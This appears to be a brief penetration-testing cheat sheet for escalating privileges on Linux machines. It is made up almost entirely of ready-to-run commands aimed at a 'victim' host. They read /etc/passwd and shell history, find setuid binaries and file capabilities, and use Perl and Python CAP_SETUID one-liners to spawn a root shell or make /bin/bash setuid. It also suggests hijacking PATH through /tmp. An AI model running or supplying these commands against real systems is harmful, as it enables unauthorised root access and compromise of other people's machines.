# Linux Priviledge Escalation

------------------------------------------------------

### Initial Commands
`whoami;id`

`cat /etc/passwd`

`sudo -l`


### Find Setuid enabled Programs
`find / -perm -u=s -type f 2>/dev/null`

### Capabilities search 
`getcap -r / 2>/dev/null`

### If perl or python have CAP_SETUID capabilities, run following commands and then execute the file(for python)

* Perl: 
`perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'`

* Python:
`echo "import os;os.setuid(0);os.system('chmod u+s /bin/bash')" >test.py`

### For MySql Service:
Connect to Mysql server from the victim : `mysql -u username -h localhost --password=userpassword -D databasename -e 'show tables;'`

### Other useful commands and tips

* `df` - to see free disk space of all mounted devices

* Remember `echo "/bin/bash">file`  NOT  `cp /bin/bash ./file`

* `export PATH=/tmp:$PATH` 

* `cat ~/.bash_history`

* Always check the home and tmp directories.
 